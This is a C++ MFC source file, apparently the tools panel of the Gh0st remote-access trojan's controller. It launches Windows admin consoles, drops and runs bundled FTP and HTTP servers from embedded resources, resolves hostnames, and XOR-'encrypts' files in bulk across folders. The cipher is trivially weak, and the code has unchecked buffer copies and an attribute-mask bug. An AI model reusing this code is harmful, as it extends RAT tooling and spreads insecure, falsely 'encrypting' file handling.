// Play.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "Play.h"
#include <afxtempl.h>
#include "SBDestination.h"
#include "PcView.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CPcView* g_pConnectView;
/////////////////////////////////////////////////////////////////////////////
// CPlay

IMPLEMENT_DYNCREATE(CPlay, CFormView)

CPlay::CPlay()
	: CFormView(CPlay::IDD)
{
	//{{AFX_DATA_INIT(CPlay)
	m_SubDirFlg = FALSE;
	m_FileName = _T("");
	m_Hidden = FALSE;
	m_Password = _T("");
	m_Readonly = FALSE;
	m_SurePassword = _T("");
	m_host = _T("");
	//}}AFX_DATA_INIT
	m_Busy=FALSE;
}

CPlay::~CPlay()
{
}

void CPlay::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CPlay)
	DDX_Control(pDX, IDC_IPdizhi, m_ip);
	DDX_Control(pDX, IDC_MSG_LIST, m_MsgList);
	DDX_Check(pDX, IDC_DIRECTORY, m_SubDirFlg);
	DDX_Text(pDX, IDC_FILENAME, m_FileName);
	DDV_MaxChars(pDX, m_FileName, 255);
	DDX_Check(pDX, IDC_HIDDEN, m_Hidden);
	DDX_Text(pDX, IDC_PASSWORD, m_Password);
	DDV_MaxChars(pDX, m_Password, 24);
	DDX_Check(pDX, IDC_READONLY, m_Readonly);
	DDX_Text(pDX, IDC_SURE_PASSWORD, m_SurePassword);
	DDV_MaxChars(pDX, m_SurePassword, 24);
	DDX_Text(pDX, IDC_HOST, m_host);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CPlay, CFormView)
	//{{AFX_MSG_MAP(CPlay)
	ON_BN_CLICKED(IDC_BUTTON9, OnButton9)
	ON_BN_CLICKED(IDC_BUTTON15, OnButton15)
	ON_BN_CLICKED(IDC_FTPServe, OnFTPServer)
	ON_BN_CLICKED(IDC_Hfs, OnHfs)
	ON_BN_CLICKED(IDC_LOCK, OnLock)
	ON_BN_CLICKED(IDC_VIEW, OnView)
	ON_EN_CHANGE(IDC_FILENAME, OnChanged)
	ON_EN_CHANGE(IDC_EDIT1, OnChangeEdit1)
	ON_EN_CHANGE(IDC_PASSWORD, OnChanged)
	ON_EN_CHANGE(IDC_SURE_PASSWORD, OnChanged)
	ON_BN_CLICKED(IDC_BUTTON1, OnConvert)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPlay diagnostics

#ifdef _DEBUG
void CPlay::AssertValid() const
{
	CFormView::AssertValid();
}

void CPlay::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CPlay message handlers
extern BOOL FreeResFile(DWORD dwResName, LPCSTR lpResType, LPCSTR lpFilePathName );  
/*{     
    HMODULE hInstance = ::GetModuleHandle(NULL);//得到自身实例句柄  
	
    HRSRC hResID = ::FindResource(hInstance,MAKEINTRESOURCE(dwResName),lpResType);//查找资源  
    HGLOBAL hRes = ::LoadResource(hInstance,hResID);//加载资源  
    LPVOID pRes = ::LockResource(hRes);//锁定资源  
	
    if (pRes == NULL)//锁定失败  
    {  
        return FALSE;  
    }  
    DWORD dwResSize = ::SizeofResource(hInstance,hResID);//得到待释放资源文件大小  
    HANDLE hResFile = CreateFile(lpFilePathName,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);//创建文件  
	
    if (INVALID_HANDLE_VALUE == hResFile)  
    {  
        //TRACE("创建文件失败！");  
        return FALSE;  
    }  
	
    DWORD dwWritten = 0;//写入文件的大小     
    WriteFile(hResFile,pRes,dwResSize,&dwWritten,NULL);//写入文件  
    CloseHandle(hResFile);//关闭文件句柄  
	
    return (dwResSize == dwWritten);//若写入大小等于文件大小，返回成功，否则失败  
}*/
void CPlay::OnButton9()  //计算机管理
{
	// TODO: Add your control notification handler code here
	ShellExecute(NULL,"open","compmgmt.msc",NULL,NULL,SW_SHOW);
}



void CPlay::OnButton15() //组策略
{
	// TODO: Add your control notification handler code here
	ShellExecute(NULL,"open","gpedit.msc",NULL,NULL,SW_SHOW);
}

void CPlay::OnFTPServer() 
{


	TCHAR szMSTSC[MAX_PATH], szMsg[MAX_PATH];
	GetModuleFileName(NULL, szMSTSC, sizeof(szMSTSC));
	*_tcsrchr( szMSTSC, '\\' ) = '\0';
	lstrcat(szMSTSC, _T("\\Control\\ftp.exe"));
	if (GetFileAttributes(szMSTSC) == INVALID_FILE_ATTRIBUTES)
	{
		// 		wsprintf(szMsg, _T("本地文件 %s丢失!\n!"), szMSTSC);
		// 		MessageBox(szMsg, _T("警告!"), MB_ICONWARNING | MB_OK);
		// 		return;
		FreeResFile(IDR_FTP ,"EXE",szMSTSC);
	}
	ShellExecute(NULL,"open",szMSTSC,NULL,NULL,SW_SHOW);
	// TODO: Add your control notification handler code here
// 	CHAR ModuletemDis[MAX_PATH]={0};
// 	sprintf(ModuletemDis,"%s\\Control\\FTPServer.exe",((CGh0stApp *)AfxGetApp())->ModuletemDir);   //连接目录和程序名称
// 	
// 	if(INVALID_FILE_ATTRIBUTES==GetFileAttributes(ModuletemDis))
// 	{
// 		MessageBox("FTPServer.exe文件丢失！无法启动FIP服务器... ","警告！",MB_OK);
// 		return;
// 	}
// 	
//     ShellExecute(NULL,"open",ModuletemDis,NULL,NULL,SW_SHOW);   //打开程序
}

void CPlay::OnHfs() 
{
	TCHAR szMSTSC[MAX_PATH], szMsg[MAX_PATH];
	GetModuleFileName(NULL, szMSTSC, sizeof(szMSTSC));
	*_tcsrchr( szMSTSC, '\\' ) = '\0';
	lstrcat(szMSTSC, _T("\\Control\\hfs.exe"));
	if (GetFileAttributes(szMSTSC) == INVALID_FILE_ATTRIBUTES)
	{
		// 		wsprintf(szMsg, _T("本地文件 %s丢失!\n!"), szMSTSC);
		// 		MessageBox(szMsg, _T("警告!"), MB_ICONWARNING | MB_OK);
		// 		return;
		FreeResFile(IDR_HFS ,"EXE",szMSTSC);
	}
	ShellExecute(NULL,"open",szMSTSC,NULL,NULL,SW_SHOW);
	// TODO: Add your control notification handler code here
// 	CHAR ModuletemDis[MAX_PATH]={0};
// 	sprintf(ModuletemDis,"%s\\Control\\hfs.exe",((CGh0stApp *)AfxGetApp())->ModuletemDir);   //连接目录和程序名称
// 
// 
// 	if(INVALID_FILE_ATTRIBUTES==GetFileAttributes(ModuletemDis))
// 	{
// 		MessageBox("hfs.exe文件丢失！无法启动HTTP服务器... ","警告！",MB_OK);
// 		return;
// 	}
// 	
//     ShellExecute(NULL,"open",ModuletemDis,NULL,NULL,SW_SHOW);   //打开程序
}


void CPlay::OnLock() 
{
	// TODO: Add your control notification handler code here
	if(UpdateData()==FALSE) return;
	char FileName[MAX_PATH];
	strcpy(FileName,m_FileName);
	while(strlen(FileName) && FileName[0]==' ') strcpy(FileName,FileName+1);
	if(GetFocus()==GetDlgItem(IDC_LOCK))/*NextDlgCtrl()*/;
	GetDlgItem(IDC_FILENAME)->SetFocus();

	m_isNet=(memcmp(FileName,"\\\\",2)==0);

	char CurPath[_MAX_PATH],Drive[_MAX_DRIVE],Dir[_MAX_DIR],FName[_MAX_FNAME],Ext[_MAX_EXT];
	GetCurrentDirectory(MAX_PATH,CurPath);
	if(IsDir(FileName)==TRUE) {
		if(FileName[strlen(FileName)-1]!='\\') strcat(FileName,"\\");
		strcat(FileName,"*.*");
	}
	_splitpath(FileName,Drive,Dir,FName,Ext);
	if(m_isNet) {
		strcpy(CurPath,Dir);
		strcpy(FName,FileName);
	} else {
		if(strlen(Drive)==0) memcpy(Drive,CurPath,2);
		if(strlen(Dir)==0) strcpy(Dir,CurPath+2);
		if(strlen(FName)==0) strcpy(FName,"*");
		if(strlen(Ext)==0) strcpy(Ext,".*");
		_makepath(CurPath,Drive,Dir,"","");
		strcat(FName,Ext);
	}
	char tmpBuf[MAX_PATH],DispName[256];
	GetDispName(DispName,FName);
	sprintf(tmpBuf,"确认对目录 %s %s的文件 %s 执行加/解密操作吗 ?",CurPath,m_SubDirFlg?"及其子目录":"",DispName);
	if(MessageBox(tmpBuf," 操作确认 ",MB_YESNO|MB_ICONQUESTION)==IDYES) {
		HCURSOR hCursor=SetCursor(LoadCursor(NULL,MAKEINTRESOURCE(IDC_WAIT)));
		m_Busy=TRUE;
		OnChanged();
		m_DirNum=m_TotalFileNum=m_OkFileNum=0;
		m_MsgList.ResetContent();

		LockFile(CurPath,FName,m_Password);
		
		m_FileName="";
		UpdateData(FALSE);
		m_Busy=FALSE;
		OnChanged();

		char tmpBuf[256];
		DisplayMessage("","");
		sprintf(tmpBuf,"总共 %d 文件(s) 在 %d 目录(s).",m_TotalFileNum,m_DirNum);
		DisplayMessage(tmpBuf,"");
		sprintf(tmpBuf,"%d 成功, %d 失败",m_OkFileNum,m_TotalFileNum-m_OkFileNum);
		DisplayMessage("  ",tmpBuf);
		DisplayMessage("");
		SetCursor(hCursor);
	}
}
#define IDS_TITLE                       102

void CPlay::OnView() 
{
	// TODO: Add your control notification handler code here
	if(UpdateData()==FALSE) return;
	
	CSBDestination sb(m_hWnd,IDS_TITLE);
	sb.SetFlags( BIF_RETURNONLYFSDIRS | BIF_BROWSEINCLUDEFILES /*| BIF_STATUSTEXT */);
	sb.SetInitialSelection(m_FileName);
	if (sb.SelectFolder()) {
		m_FileName = sb.GetSelectedFolder();
		UpdateData(FALSE);
		OnChanged();
	}
}

bool CPlay::IsDir(char* pFileName)
{
	char FileName[MAX_PATH];
	strcpy(FileName,pFileName);

	BOOL bIsDir=FALSE;
	char ch=FileName[strlen(FileName)-1];
	if(ch=='\\' || ch==':') bIsDir=TRUE;
	else if(memcmp(FileName,"\\\\",2)==0) if(strstr(FileName+2,"\\")==NULL) bIsDir=TRUE;
	if(bIsDir==FALSE) {
		strcat(FileName,"\\*.*");
		CFileFind Finder;
		bIsDir=Finder.FindFile(FileName);
		Finder.Close();
	}
	return (bIsDir==TRUE);
}

bool CPlay::IsDir(CString strFileName)
{
	char FileName[MAX_PATH];
	strcpy(FileName,strFileName);
	return IsDir(FileName);
}

void CPlay::DisplayMessage(char* pStr,char* pExt)
{
	char tmpBuf[MAX_PATH];
	if(pStr==NULL && pExt && m_MsgList.GetCount()) {
		m_MsgList.GetText(m_MsgList.GetCount()-1,tmpBuf);
		pStr=tmpBuf;
		m_MsgList.DeleteString(m_MsgList.GetCount()-1);
	} else if(pStr!=NULL && pExt==NULL) {
		if(strlen(pStr)>MSG_LEN) {
			char p[MAX_PATH];
			GetShortName(pStr,p);
			strcpy(pStr,p);
		}
	}
	if(pStr) strcpy(tmpBuf,pStr);
	else tmpBuf[0]=0;
	if(pExt) strcat(tmpBuf,pExt);
	m_MsgList.AddString(tmpBuf);
}

void CPlay::DisplayMessage(char* pStr,CString Ext)
{
	char tmpBuf[MAX_PATH];
	if(pStr==NULL && m_MsgList.GetCount()) {
		m_MsgList.GetText(m_MsgList.GetCount()-1,tmpBuf);
		pStr=tmpBuf;
		m_MsgList.DeleteString(m_MsgList.GetCount()-1);
	}
	if(pStr) strcpy(tmpBuf,pStr);
	else tmpBuf[0]=0;
	strcat(tmpBuf,Ext);
	m_MsgList.AddString(tmpBuf);
}

void CPlay::DisplayMessage(CString str,char* pExt)
{
	if(pExt==NULL) {
		if(str.GetLength()>MSG_LEN) {
			char p[MAX_PATH];
			GetShortName(str.GetBuffer(MAX_PATH),p);
			str.ReleaseBuffer();
			str=p;
		}
	} else str+=pExt;

	m_MsgList.AddString(str);
}

void CPlay::DisplayMessage(CString str,CString Ext)
{
	str+=Ext;
	m_MsgList.AddString(str);
}

void CPlay::GetShortName(char* pLongName,char* pShortName)
{
	char tmpBuf[MAX_PATH],*p=tmpBuf;
	if(pLongName==NULL) return;
	int Len=strlen(pLongName);
	if(Len>MAX_PATH) return;
	strcpy(tmpBuf,pLongName);
	if(pShortName==NULL) pShortName=pLongName;
	strcpy(pShortName,tmpBuf);
	if(Len<=MSG_LEN) return;

	int i,Pos1=-1,Pos2=-1;
	for(i=0;i<Len;i++) {
		if(*p=='\\') { if(Pos1==-1) Pos1=i; Pos2=i; }
		p++;
	}
	if(Pos1==Pos2) Pos1=-1;
	if(Pos2<(MSG_LEN-12)) {
		if(strstr(tmpBuf,".") && (Pos2=strlen(strstr(tmpBuf,".")))<(MSG_LEN/2)) {
			memcpy(pShortName,tmpBuf,MSG_LEN-3-Pos2);
			strcpy(pShortName+MSG_LEN-3-Pos2,"...");
			strcpy(pShortName+MSG_LEN-Pos2,strstr(tmpBuf,"."));
		} else {
			memcpy(pShortName,tmpBuf,MSG_LEN-3);
			strcpy(pShortName+MSG_LEN-3,"...");
		}
		return;
	}
	while(1) {
		p=tmpBuf+Pos1+1;
		for(i=Pos1+1;i<Pos2;i++) {
			if(*p=='\\') break;
			p++;
		}
		if(i<Pos2 && (Pos2-i)>(Len-(MSG_LEN-3)) || (i<(MSG_LEN-15))) Pos1=i;
		else break;
	}
	if(Pos1==-1 && Pos2>(MSG_LEN-14)) Pos1=MSG_LEN-17;
	memcpy(pShortName,tmpBuf,Pos1+1);
	strcpy(pShortName+Pos1+1,"...");
	if((Len-Pos2)>(MSG_LEN-Pos1-4)) {
		int Len;
		if(strstr(tmpBuf+Pos2,".") && (Len=strlen(strstr(tmpBuf+Pos2,".")))<10) {
			memcpy(pShortName+Pos1+4,tmpBuf+Pos2,MSG_LEN-3-Pos1-4-Len);
			strcpy(pShortName+MSG_LEN-3-Len,"...");
			strcpy(pShortName+MSG_LEN-Len,strstr(tmpBuf+Pos2,"."));
		} else {
			memcpy(pShortName+Pos1+4,tmpBuf+Pos2,MSG_LEN-3-Pos1-4);
			strcpy(pShortName+MSG_LEN-3,"...");
		}
	} else strcpy(pShortName+Pos1+4,tmpBuf+Pos2);
}

void CPlay::GetDispName(char* pShortName,char* pLongName)
{
	if(pShortName==NULL) return;
	strcpy(pShortName,pLongName);
	while(strstr(pShortName,"\\")) strcpy(pShortName,strstr(pShortName,"\\")+1);
}

void CPlay::GetDispName(CString& strShortName,CString strLongName)
{
	char ShortName[MAX_PATH],LongName[MAX_PATH];
	strcpy(LongName,strLongName);
	GetDispName(ShortName,LongName);
	strShortName=ShortName;
}

void CPlay::OnChanged() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CFormView::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	if(UpdateData()==FALSE) return;
	GetDlgItem(IDC_LOCK)->EnableWindow(m_Busy==FALSE && m_FileName.IsEmpty()==FALSE && m_Password.IsEmpty()==FALSE && m_SurePassword==m_Password);
}

typedef CList<CString,CString> CFileList;

void CPlay::LockFile(CString DirName,CString FileName,CString Password)
{
	CString FindName,DispName;
	CFileList FileList,DirList;
	FileList.RemoveAll();
	DirList.RemoveAll();

	char CurDir[MAX_PATH];
	GetCurrentDirectory(MAX_PATH,CurDir);
	if(m_isNet || SetCurrentDirectory(DirName)==TRUE) {
		if(DirName.GetLength()>(MSG_LEN-23)) {
			DisplayMessage("Process directory ---- ","");
			DisplayMessage(DirName,NULL);
		} else DisplayMessage("Process directory ---- ",DirName);
	}
	
	CFileFind Finder;
	BOOL bOK=Finder.FindFile(FileName);
	if(bOK) {
		while(bOK) {
			bOK = Finder.FindNextFile();
			if(Finder.IsDirectory()==FALSE) {
				FindName=m_isNet?Finder.GetFilePath():Finder.GetFileName();
				FileList.AddTail(FindName);
				m_TotalFileNum++;
			}
		}
	}
	Finder.Close();
	if(m_SubDirFlg) {
		if(m_isNet) {
			if(DirName.GetAt(DirName.GetLength()-1)!='\\') DirName+="\\";
			DirName+="*.*";
		}
		bOK=Finder.FindFile(m_isNet?DirName:"*.*");
		if(bOK) {
			while(bOK) {
				bOK = Finder.FindNextFile();
				if(Finder.IsDirectory() && Finder.IsDots()==FALSE) {
					FindName=Finder.GetFilePath();
					DirList.AddTail(FindName);
				}
			}
		}
		Finder.Close();
	}
	
	m_DirNum++;

	HANDLE hFile;
	DWORD dwFileAttr,dwNewAttr;
	POSITION pos=FileList.GetHeadPosition();
	if(FileList.GetCount()==0) DisplayMessage("File not found","");
	else for(int i=0;i<FileList.GetCount();i++) {
		FindName=FileList.GetNext(pos);
		GetDispName(DispName,FindName);
		DisplayMessage(DispName,NULL);
		if((dwFileAttr=GetFileAttributes(FindName))!=-1) {
			dwNewAttr=dwFileAttr;
			if(m_Readonly) dwNewAttr &= ~FILE_ATTRIBUTE_READONLY;
			if(m_Hidden) dwNewAttr &= ~FILE_ATTRIBUTE_HIDDEN | ~FILE_ATTRIBUTE_SYSTEM;
			else if(dwFileAttr & (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) dwNewAttr |= FILE_ATTRIBUTE_READONLY;
			SetFileAttributes(FindName,dwNewAttr);
		}
		hFile=CreateFile(FindName,GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
		if(hFile==INVALID_HANDLE_VALUE) DisplayMessage(NULL,",Fail");
		else {
			DWORD nBytes,nBytesRead;
			nBytes=GetFileSize(hFile,&nBytesRead);
			if(nBytes>(10*1024*1024)) nBytes=10*1024*1024;
			char* pBuf=new char[nBytes];
			if(pBuf!=NULL) {
				FILETIME tm1,tm2,tm3;
				GetFileTime(hFile,&tm1,&tm2,&tm3);
				if(ReadFile(hFile,pBuf,nBytes,&nBytesRead,NULL)!=FALSE && nBytesRead==nBytes) {
					PassData(pBuf,nBytes,Password);
					if(SetFilePointer(hFile,0,NULL,FILE_BEGIN)==0 && WriteFile(hFile,pBuf,nBytes,&nBytesRead,NULL)!=FALSE && nBytesRead==nBytes) {
						DisplayMessage(NULL,",OK");
						m_OkFileNum++;
					} else DisplayMessage(NULL,",Fail");
				} else DisplayMessage(NULL,",Fail");
				SetFileTime(hFile,&tm1,&tm2,&tm3);
				delete pBuf;
			} else DisplayMessage(NULL,",Fail");
			CloseHandle(hFile);
		}
		if(dwFileAttr!=-1) SetFileAttributes(FindName,dwFileAttr);
	}
	pos=DirList.GetHeadPosition();
	for(int i=0;i<DirList.GetCount();i++) {
		FindName=DirList.GetNext(pos);
		if(m_isNet) {
			FileName=FindName;
			if(FileName.GetAt(FileName.GetLength()-1)!='\\') FileName+="\\";
			FileName+="*.*";
		}
		LockFile(FindName,FileName,Password);
	}
	if(m_isNet==FALSE) SetCurrentDirectory(CurDir);
}

void PassData(char* pDataBuf,DWORD DataLen,CString Password)
{
	char pPass[128];
	BYTE* p=(BYTE*)pDataBuf;
	DWORD i=0,j,PassLen=Password.GetLength();
	strcpy(pPass,Password);

	while(i<DataLen) {
		for(j=0;j<PassLen;j++) {
			if((i+j)>=DataLen) break;
			*p^=pPass[j]; // 与密码异或
			*p^=0x01;     // 最后一位取反
			p++;
		}
		i+=j;
	}
}


void CPlay::OnChangeEdit1() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CFormView::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	
}

void CPlay::OnConvert() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	char domainname[100];  
	
	strcpy(domainname,m_host);  // cstring 转换成 char*
	
	SOCKADDR_IN   saddr;   
	WORD   wVersionRequested;   
	WSADATA   wsaData;   
	hostent   *pHostIp; 
	int   nErrorNum;  
    
	wVersionRequested = MAKEWORD(2,   2);   
	nErrorNum = WSAStartup(wVersionRequested,   &wsaData);   
	if(nErrorNum !=0)   
	{      
		AfxMessageBox("初始化错!");
	} 
	
	saddr.sin_family = AF_INET; 
	
	//通过gethostbyname把IP地址放到数组中
	if(pHostIp=gethostbyname((char*)domainname))   
	{   
		int   i=0;   
  
			LPCSTR   str;  
			//将网络地址转换成“.”点隔的字符串格式  
			str=inet_ntoa(*(struct  in_addr*)pHostIp->h_addr_list[i]); 
// 			m_ip.AddString(str);
	

			i++;   
	 
		  }   
	else   
	{     
		AfxMessageBox("转换出错!"); 
	}   
          return ;
}
